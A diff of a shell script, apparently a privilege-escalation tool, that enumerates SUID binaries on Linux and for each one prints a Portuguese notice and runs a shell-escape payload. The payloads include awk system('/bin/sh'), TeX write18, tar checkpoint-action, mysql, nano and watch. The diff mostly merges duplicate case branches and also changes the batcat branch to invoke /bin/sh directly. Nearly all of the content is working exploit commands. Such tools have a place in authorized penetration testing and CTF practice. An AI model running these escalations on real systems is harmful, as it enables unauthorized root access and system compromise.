@@ -30,14 +30,14 @@ for Lpath in $LSUID; do
             chmod +x $TF
             "$Lpath" --on-download-error=$TF http://x
             ;;
-        awk)
+        awk|gawk|mawk|nawk)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" 'BEGIN {system("/bin/sh")}'
             ;;
         batcat)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" --paging always /etc/profile
-            !/bin/sh
+            /bin/sh
             ;;
         byebug)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
@@ -61,16 +61,7 @@ for Lpath in $LSUID; do
             tex '\special{psfile="`/bin/sh 1>&0"}\end'
             "$Lpath" -R0 texput.dvi
             ;;
-        ed)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath"
-            !/bin/sh
-            ;;
-        gawk)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" 'BEGIN {system("/bin/sh")}'
-            ;;
-        ginsh)
+        ed|ginsh|iftop|tasksh|tdbtool)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath"
             !/bin/sh
@@ -79,17 +70,12 @@ for Lpath in $LSUID; do
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             PAGER='sh -c "exec sh 0<&1"' "$Lpath" -p help
             ;;
-        iftop)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath"
-            !/bin/sh
-            ;;
         joe)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath"
             ^K!/bin/sh
             ;;
-        latex)
+        latex|pdflatex|xelatex)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
             ;;
@@ -116,23 +102,15 @@ for Lpath in $LSUID; do
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -shell-escape '\directlua{os.execute("/bin/sh")}\end'
             ;;
-        mawk)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" 'BEGIN {system("/bin/sh")}'
-            ;;
         mysql)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -e '\! /bin/sh'
             ;;
-        nano)
+        nano|pico)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -s /bin/sh
             /bin/sh
             ^T
-            ;;
-        nawk)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" 'BEGIN {system("/bin/sh")}'
             ;;
         nc)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
@@ -159,11 +137,7 @@ for Lpath in $LSUID; do
             echo 'os.execute("/bin/sh")' >$TF
             "$Lpath" -L $TF /dev/null
             ;;
-        pdflatex)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
-            ;;
-        pdftex)
+        pdftex|tex|xetex)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" --shell-escape '\write18{/bin/sh}\end'
             ;;
@@ -172,12 +146,6 @@ for Lpath in $LSUID; do
             "$Lpath" -U
             .PS
             sh X sh X
-            ;;
-        pico)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" -s /bin/sh
-            /bin/sh
-            ^T
             ;;
         posh)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
@@ -242,15 +210,6 @@ for Lpath in $LSUID; do
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
             ;;
-        tasksh | tdbtool)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath"
-            !/bin/sh
-            ;;
-        tex | xetex)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" --shell-escape '\write18{/bin/sh}\end'
-            ;;
         tmate)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" -c /bin/sh
@@ -258,10 +217,6 @@ for Lpath in $LSUID; do
         watch)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
             "$Lpath" 'reset; exec sh 1>&0 2>&0'
-            ;;
-        xelatex)
-            echo "[+] $Lpath → Limited SUID encontrado! Teste:"
-            "$Lpath" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
             ;;
         zip)
             echo "[+] $Lpath → Limited SUID encontrado! Teste:"
